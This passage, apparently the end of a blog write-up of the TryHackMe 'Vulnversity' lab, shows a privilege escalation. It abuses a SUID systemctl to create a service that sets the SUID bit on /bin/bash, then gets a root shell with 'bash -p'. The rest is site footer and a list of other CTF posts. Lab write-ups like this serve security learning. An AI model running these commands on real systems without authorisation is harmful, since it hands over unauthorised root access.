+<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/122.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/122.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li>
+<li><p>So we’ll make a <code>System service</code> named <code>systemctl</code> &amp; run it using it’s relative path <code>./systemctl</code> &amp; we’ll execute the command <code>/bin/bash -c &quot;id &gt; /tmp/output&quot;</code></p></li>
+<li><p>The above method dosen’t work so I used this one. This one is simple I’m creating a service and giving <code>/bin/bash</code> SUID permission with <code>+s</code> option. Then executing it using the original systemctl binary.</p></li></ul>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">TF=$(mktemp).service</span></div><div class='line'><span style="color: undefined">echo '[Service]</span></div><div class='line'><span style="color: undefined">Type=oneshot</span></div><div class='line'><span style="color: undefined">ExecStart=/bin/sh -c "chmod +s /bin/bash"</span></div><div class='line'><span style="color: undefined">[Install]</span></div><div class='line'><span style="color: undefined">WantedBy=multi-user.target' &gt; $TF</span></div><div class='line'><span style="color: undefined">systemctl link $TF</span></div><div class='line'><span style="color: undefined">systemctl enable --now $TF</span></div></code></div></pre><!-- HTML_TAG_END -->
+<ul><li>If we do <code>bash -p</code> now we can see we have effective id as root. So we own the system now<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/123.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/123.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul></main>
+    <div class="divider mt-4 mb-0"></div>
+      <div><a href="/?tags=tryhackme" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#tryhackme
+          </a><a href="/?tags=ctf" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#ctf
+          </a><a href="/?tags=file upload" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#file upload
+          </a></div></div>
+  
+    </article>
+    <footer id="footer" class="footer footer-center bg-base-300 text-base-content shadow-inner p-8 md:rounded-box sticky bottom-0 z-0 md:static "><div class="prose"><p><a href="/atom.xml" rel="noopener external" target="_blank">Feed</a>
+          <span class="mr-1">·</span><a href="/sitemap.xml" rel="noopener external" target="_blank">Sitemap</a>
+          
+        <br>
+      Copyright © 2023
+      Saikat Karmakar
+      <br>
+      Powered by
+      <a rel="noopener external" target="_blank" class="tooltip tooltip-secondary hover:text-secondary" data-tip="🌸 [δ] - Based on MDsveX & SvelteKit 🌸" href="https://github.com/importantimport/urara">Urara
+      </a>
+      </p></div></footer></div></div></div>
+
+
+		<script type="module" data-sveltekit-hydrate="1lprfzw">
+			import { start } from "../../_app/immutable/start-a3379301.js";
+
+			start({
+				env: {},
+				paths: {"base":"","assets":""},
+				target: document.querySelector('[data-sveltekit-hydrate="1lprfzw"]').parentNode,
+				version: "1674503317434",
+				hydrate: {
+					node_ids: [0, 7],
+					data: [null,null],
+					form: null
+				}
+			});
+		</script>
+	<script type="application/json" data-sveltekit-fetched data-url="/posts.json">{"status":200,"statusText":"","headers":{},"body":"[{\"title\":\"Welcome Web3\",\"image\":\"/assets/info.png\",\"created\":\"2022-12-19T00:00:00.000Z\",\"updated\":\"2022-12-19T00:00:00.000Z\",\"tags\":[\"ctf\",\"web3\",\"smart contracts\",\"brownie\",\"nahamcon EU ctf 22\"],\"flags\":[],\"slug\":\"/Welcome Web3/+page.svelte.md\",\"path\":\"/Welcome Web3\",\"toc\":false,\"type\":\"article\",\"html\":\"\"},{\"title\":\"Ethernaut Fallback\",\"image\":\"https://ethernaut.openzeppelin.com/imgs/BigLevel1.svg\",\"created\":\"2022-08-17T00:00:00.000Z\",\"updated\":\"2022-12-19T00:00:00.000Z\",\"tags\":[\"smart contracts\",\"web3\",\"brownie\",\"ethernaut\"],\"flags\":[],\"slug\":\"/Ethernaut/Fallback/+page.svelte.md\",\"path\":\"/Ethernaut/Fallback\",\"toc\":[{\"depth\":2,\"title\":\"Solution\",\"slug\":\"solution\"},{\"depth\":2,\"title\":\"Approach\",\"slug\":\"approach\"},{\"depth\":2,\"title\":\"Using Brownie to run the program\",\"slug\":\"using-brownie-to-run-the-program\"}],\"type\":\"article\",\"html\":\"\"},{\"image\":\"/assets/APYxowi.png\",\"created\":\"2021-12-29T00:00:00.000Z\",\"updated\":\"2021-12-29T00:00:00.000Z\",\"flags\":[],\"slug\":\"/Yogosha Christmans CTF 21/+page.svelte.md\",\"path\":\"/Yogosha Christmans CTF 21\",\"toc\":[{\"depth\":1,\"title\":\"Yogosha Christmans CTF 21 Writeup\",\"slug\":\"yogosha-christmans-ctf-21-writeup\"}],\"type\":\"photo\",\"html\":\"\u003Ch1 id=\\\"yogosha-christmans-ctf-21-writeup\\\">\u003Ca href=\\\"#yogosha-christmans-ctf-21-writeup\\\">Yogosha Christmans CTF 21 Writeup\u003C/a>\u003C/h1>\u003Cul>\u003Cli>\u003Cp>\u003Ca href=\\\"/Yogosha%20Christmans%20CTF%2021/Welcome%20Christmas\\\">Welcome Christmans\u003C/a>\u003C/p>\u003C/li>\u003Cli>\u003Cp>\u003Ca href=\\\"/Yogosha%20Christmans%20CTF%2021/Uchiha%20Or%20Evil/\\\">Uchiha Or Evil?\u003C/a>\u003C/p>\u003C/li>\u003C/ul>\"},{\"title\":\"Welcome Christmans\",\"image\":\"/assets/APYxowi.png\",\"created\":\"2021-12-29T00:00:00.000Z\",\"updated\":\"2021-12-29T00:00:00.000Z\",\"tags\":[\"ctf\",\"yogosha\"],\"flags\":[],\"slug\":\"/Yogosha Christmans CTF 21/Welcome Christmas/+page.svelte.md\",\"path\":\"/Yogosha Christmans CTF 21/Welcome Christmas\",\"toc\":[{\"depth\":1,\"title\":\"Welcome Christmas\",\"slug\":\"welcome-christmas\"},{\"depth\":4,\"title\":\"flag\",\"slug\":\"flag\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Uchiha Or Evil ?\",\"image\":\"/assets/APYxowi.png\",\"created\":\"2021-12-19T00:00:00.000Z\",\"updated\":\"2021-12-19T00:00:00.000Z\",\"tags\":[\"ctf\",\"yogosha\"],\"flags\":[],\"slug\":\"/Yogosha Christmans CTF 21/Uchiha Or Evil/+page.svelte.md\",\"path\":\"/Yogosha Christmans CTF 21/Uchiha Or Evil\",\"toc\":[{\"depth\":1,\"title\":\"Uchiha Or Evil ?\",\"slug\":\"uchiha-or-evil-\"},{\"depth\":4,\"title\":\"Thank you for reading this write-up I hope it helped you. I was only able to solve only the first 2 challenges so that’s all from me. I hope you learned something. I’ll try to add links of other people whole solved the entire thing\",\"slug\":\"thank-you-for-reading-this-write-up-i-hope-it-helped-you-i-was-only-able-to-solve-only-the-first-2-challenges-so-thats-all-from-me-i-hope-you-learned-something-ill-try-to-add-links-of-other-people-whole-solved-the-entire-thing\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"ToC Disabled\",\"summary\":\"This post has disabled table of contents.\",\"created\":\"2021-12-12T00:00:00.000Z\",\"tags\":[\"Front-Matter\"],\"toc\":false,\"flags\":[],\"updated\":\"2023-01-23T19:48:11.911Z\",\"slug\":\"/Welcome Web3/toc-disabled/+page.md\",\"path\":\"/Welcome Web3/toc-disabled\",\"type\":\"article\",\"html\":\"\"},{\"title\":\"Gitlab-11.4.7 Remote Code Execution(RCE) Exploitation\",\"created\":\"2021-09-03T00:00:00.000Z\",\"updated\":\"2022-12-19T00:00:00.000Z\",\"tags\":[\"gitlab\",\"ctf\",\"rce\"],\"flags\":[],\"slug\":\"/GitLab11.4.7-RCE/+page.svelte.md\",\"path\":\"/GitLab11.4.7-RCE\",\"toc\":false,\"type\":\"article\",\"html\":\"\"},{\"title\":\"SQL Injection By Reponse Size\",\"created\":\"2021-09-03T00:00:00.000Z\",\"tags\":[\"ctf\",\"sqli\",\"web\"],\"flags\":[],\"updated\":\"2023-01-23T19:48:11.911Z\",\"slug\":\"/SQL Injection Using Threading/+page.svelte.md\",\"path\":\"/SQL Injection Using Threading\",\"toc\":false,\"type\":\"article\",\"html\":\"\"},{\"title\":\"HackTheBox Challenge - Web - wafwaf\",\"image\":\"/assets/wafwaf.png\",\"created\":\"2021-08-21T00:00:00.000Z\",\"tags\":[\"ctf\",\"sqli\",\"htb\",\"web\"],\"flags\":[],\"updated\":\"2023-01-23T19:48:11.911Z\",\"slug\":\"/HackTheBox/wafwaf/+page.svelte.md\",\"path\":\"/HackTheBox/wafwaf\",\"toc\":false,\"type\":\"article\",\"html\":\"\"},{\"title\":\"TryHackMe Vulnversity\",\"image\":\"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/11.png\",\"created\":\"2021-08-09T00:00:00.000Z\",\"updated\":\"2022-12-19T00:00:00.000Z\",\"tags\":[\"tryhackme\",\"ctf\",\"file upload\"],\"flags\":[],\"slug\":\"/TryHackme/Vulnversity/+page.svelte.md\",\"path\":\"/TryHackme/Vulnversity\",\"toc\":[{\"depth\":6,\"title\":\"Task 2\",\"slug\":\"task-2\"},{\"depth\":6,\"title\":\"Task 3\",\"slug\":\"task-3\"},{\"depth\":6,\"title\":\"Task 4\",\"slug\":\"task-4\"},{\"depth\":6,\"title\":\"Task 5\",\"slug\":\"task-5\"}],\"type\":\"article\",\"html\":\"\"}]"}</script>
+  </body>
+</html>
